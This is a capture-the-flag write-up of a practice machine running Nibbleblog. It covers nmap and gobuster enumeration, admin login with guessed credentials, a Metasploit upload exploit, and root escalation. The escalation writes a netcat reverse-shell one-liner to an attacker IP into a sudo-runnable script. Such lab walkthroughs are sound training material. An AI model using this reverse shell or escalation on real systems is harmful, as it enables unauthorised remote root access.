# nmap

```
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-14 09:12 IST
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:12
Completed NSE at 09:12, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:12
Completed NSE at 09:12, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:12
Completed NSE at 09:12, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 09:12
Completed Parallel DNS resolution of 1 host. at 09:12, 0.04s elapsed
Initiating SYN Stealth Scan at 09:12
Scanning 10.129.186.152 [20000 ports]
Discovered open port 80/tcp on 10.129.186.152
Discovered open port 22/tcp on 10.129.186.152
SYN Stealth Scan Timing: About 22.60% done; ETC: 09:15 (0:01:46 remaining)
SYN Stealth Scan Timing: About 30.43% done; ETC: 09:16 (0:02:19 remaining)
SYN Stealth Scan Timing: About 60.37% done; ETC: 09:17 (0:02:03 remaining)
SYN Stealth Scan Timing: About 67.61% done; ETC: 09:18 (0:01:44 remaining)
SYN Stealth Scan Timing: About 86.25% done; ETC: 09:17 (0:00:39 remaining)
Completed SYN Stealth Scan at 09:19, 377.14s elapsed (20000 total ports)
Initiating Service scan at 09:19
Scanning 2 services on 10.129.186.152
Completed Service scan at 09:19, 6.96s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 10.129.186.152
Retrying OS detection (try #2) against 10.129.186.152
Retrying OS detection (try #3) against 10.129.186.152
Retrying OS detection (try #4) against 10.129.186.152
Retrying OS detection (try #5) against 10.129.186.152
Initiating Traceroute at 09:19
Completed Traceroute at 09:19, 0.59s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 09:19
Completed Parallel DNS resolution of 2 hosts. at 09:19, 0.06s elapsed
NSE: Script scanning 10.129.186.152.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:19
Completed NSE at 09:19, 10.68s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:19
Completed NSE at 09:19, 2.11s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:19
Completed NSE at 09:19, 0.00s elapsed
Nmap scan report for 10.129.186.152
Host is up, received user-set (0.32s latency).
Scanned at 2021-08-14 09:12:48 IST for 420s
Not shown: 19998 closed ports
Reason: 19998 resets
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD8ArTOHWzqhwcyAZWc2CmxfLmVVTwfLZf0zhCBREGCpS2WC3NhAKQ2zefCHCU8XTC8hY9ta5ocU+p7S52OGHlaG7HuA5Xlnihl1INNsMX7gpNcfQEYnyby+hjHWPLo4++fAyO/lB8NammyA13MzvJy8pxvB9gmCJhVPaFzG5yX6Ly8OIsvVDk+qVa5eLCIua1E7WGACUlmkEGljDvzOaBdogMQZ8TGBTqNZbShnFH1WsUxBtJNRtYfeeGjztKTQqqj4WD5atU8dqV/iwmTylpE7wdHZ+38ckuYL9dmUPLh4Li2ZgdY6XniVOBGthY5a2uJ2OFp2xe1WS9KvbYjJ/tH
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPiFJd2F35NPKIQxKMHrgPzVzoNHOJtTtM+zlwVfxzvcXPFFuQrOL7X6Mi9YQF9QRVJpwtmV9KAtWltmk3qm4oc=
|   256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC/RjKhT/2YPlCgFQLx+gOXhC6W3A3raTzjlXQMT8Msk
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-title: Site doesn't have a title (text/html).
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=8/14%OT=22%CT=1%CU=35358%PV=Y%DS=2%DC=T%G=Y%TM=61173D5
OS:C%P=x86_64-pc-linux-gnu)SEQ(SP=109%GCD=1%ISR=10B%TI=Z%CI=I%II=I%TS=8)OPS
OS:(O1=M54BST11NW7%O2=M54BST11NW7%O3=M54BNNT11NW7%O4=M54BST11NW7%O5=M54BST1
OS:1NW7%O6=M54BST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN
OS:(R=Y%DF=Y%T=40%W=7210%O=M54BNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Uptime guess: 0.002 days (since Sat Aug 14 09:16:13 2021)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=265 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 587/tcp)
HOP RTT       ADDRESS
1   593.65 ms 10.10.16.1
2   362.24 ms 10.129.186.152

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:19
Completed NSE at 09:19, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:19
Completed NSE at 09:19, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:19
Completed NSE at 09:19, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 421.62 seconds
           Raw packets sent: 22661 (1.001MB) | Rcvd: 33009 (3.465MB)
```
so yeah,port 80(http) and 22 (ssh) are open.

# gobuster

```
gobuster dir -u http://10.129.186.152/ -w /usr/share/dirb/wordlists/common.txt -e -n  
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.186.152/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Expanded:                true
[+] No status:               true
[+] Timeout:                 10s
===============================================================
2021/08/14 10:03:11 Starting gobuster in directory enumeration mode
===============================================================
http://10.129.186.152/.hta                 [Size: 293]
http://10.129.186.152/.htpasswd            [Size: 298]
http://10.129.186.152/.htaccess            [Size: 298]
http://10.129.186.152/index.html           [Size: 93] 
http://10.129.186.152/server-status        [Size: 302]
                                                      
===============================================================
2021/08/14 10:04:57 Finished
===============================================================
```
viewing source of the webpage(http://IP of machine) gives us a lead

![webpage](/Images/webpage-nibbles-1.PNG)

directory lisiting on the nibbleblog page gives quite a few results.
```
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.188.106/nibbleblog
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Expanded:                true
[+] No status:               true
[+] Timeout:                 10s
===============================================================
2021/08/14 10:28:08 Starting gobuster in directory enumeration mode
===============================================================
http://10.129.188.106/nibbleblog/.htaccess            [Size: 309]
http://10.129.188.106/nibbleblog/.hta                 [Size: 304]
http://10.129.188.106/nibbleblog/.htpasswd            [Size: 309]
http://10.129.188.106/nibbleblog/admin                [Size: 327] [--> http://10.129.188.106/nibbleblog/admin/]
http://10.129.188.106/nibbleblog/admin.php            [Size: 1401]                                             
http://10.129.188.106/nibbleblog/content              [Size: 329] [--> http://10.129.188.106/nibbleblog/content/]
http://10.129.188.106/nibbleblog/index.php            [Size: 2987]                                               
http://10.129.188.106/nibbleblog/languages            [Size: 331] [--> http://10.129.188.106/nibbleblog/languages/]
http://10.129.188.106/nibbleblog/plugins              [Size: 329] [--> http://10.129.188.106/nibbleblog/plugins/]  
http://10.129.188.106/nibbleblog/README               [Size: 4628]                                                 
http://10.129.188.106/nibbleblog/themes               [Size: 328] [--> http://10.129.188.106/nibbleblog/themes/]   
                                                                                                                   
===============================================================
2021/08/14 10:30:00 Finished
===============================================================
```

/nibbleblog/admin.php is one of them which is a login page.

# metasploit

i searched nibbleblog on metasploit and found a arbitrary file upload vulnerability which require username and password.

I tried brute forcing the login page with hydra and also got a few results but they are not working :(


I tried logging into the admin.php page with admin and pass as nibbles it worked.Now as i know the login creds i used metasploit to gain a shell.

Running metasploit gives us a meterpreter session.

![metasploit](/Images/metasploit-nibbles.PNG)

Time to privesc.

# Privilege  Escalation

I ran the command sudo -l to find files that we cam run as root and found a shell script monitor.sh and we have write permissions

>echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.4 4242 >/tmp/f" > monitor.sh

on my attack machine
>nc -lnvp 4242

on the target machine
>sudo ./monitor.sh

and i got a reverse shell as root :)

![root](/Images/root-nibbles.PNG)